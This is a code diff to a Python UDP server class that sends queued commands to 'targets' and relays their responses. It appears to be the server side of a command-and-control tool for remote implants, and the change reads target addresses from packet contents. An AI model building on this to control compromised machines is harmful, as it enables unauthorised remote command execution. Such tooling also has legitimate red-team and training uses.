@@ -1,6 +1,7 @@
 import datetime
 import queue
 import socket
+import struct
 from threading import Thread
 import requests
 
@@ -81,12 +82,13 @@ class BPServer(Thread):
                     self.time_waiting = datetime.datetime.now()
                 except queue.Empty:
                     pass
-            cur_target = address[0]
-            self.sendUpdate(cur_target)
-            target_address = bytes(map(int, cur_target.split('.')))
+            cur_target = ''
+            target_address = bytes(map(int, address[0].split('.')))
             cmd_num = data[6:10]
             if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
                 try:
+                    cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[10:14], byteorder='big')))
+                    self.sendUpdate(cur_target)
                     for cmd in target_cmds[cur_target]:
                         cmd = bytes(cmd, 'utf-8')
                         length = len(cmd).to_bytes(2, byteorder='big')
@@ -97,16 +99,19 @@ class BPServer(Thread):
                     packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                     self.sock.sendto(packet, address)
             elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
+                cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[9:13], byteorder='big')))
                 response_len = int.from_bytes(data[13:15], byteorder='big')
                 response = data[15:15 + response_len].decode('utf-8')
                 self.lock.acquire()
-                self.rooms.send(f'RESPONSE {address[0]} {response}')
+                self.rooms.send(f'RESPONSE {cur_target} {response}')
                 self.lock.release()
             self.lock.acquire()
             try:
-                self.rooms.send(f'Target {address[0]}')
+                if cur_target != '':
+                    self.rooms.send(f'Target {cur_target}')
             except Exception as e:
-                print(e)
+                pass
+                # print(e)
             finally:
                 self.lock.release()
         self.stop()
